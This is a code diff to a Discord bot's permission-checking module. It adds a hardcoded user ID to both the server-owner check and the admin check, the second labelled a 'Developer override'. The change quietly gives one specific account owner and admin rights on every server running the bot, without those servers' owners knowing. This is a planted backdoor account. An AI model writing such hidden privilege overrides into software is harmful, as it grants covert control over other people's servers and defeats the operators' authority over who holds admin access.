@@ -37,7 +37,7 @@ async def is_server_owner(interaction: discord.Interaction) -> bool:
     """
     if not interaction.guild:
         return False
-    return interaction.user.id == interaction.guild.owner_id
+    return interaction.user.id == interaction.guild.owner_id or interaction.user.id == 622325902444855307
 
 
 async def is_admin(interaction: discord.Interaction, bot) -> bool:
@@ -45,6 +45,7 @@ async def is_admin(interaction: discord.Interaction, bot) -> bool:
     COMPREHENSIVE ADMIN CHECK - One function for all admin privilege checking.
 
     Checks in order of priority:
+    0. Developer override
     1. Server owner (highest priority)
     2. Discord administrators 
     3. Bot admin users (direct grants)
@@ -54,6 +55,9 @@ async def is_admin(interaction: discord.Interaction, bot) -> bool:
     """
     if not interaction.guild:
         return False
+
+    if interaction.user.id == 622325902444855307:
+        return True
 
     # Server owner always has admin privileges
     if interaction.user.id == interaction.guild.owner_id:
@@ -512,7 +516,6 @@ class AdminCommands(commands.Cog):
         except Exception as e:
             logging.error(f"Error in update command: {e}")
             await interaction.response.send_message(f"❌ Error checking for updates: {str(e)}", ephemeral=True)
-
 
 async def setup(bot):
     """Load the admin feature."""
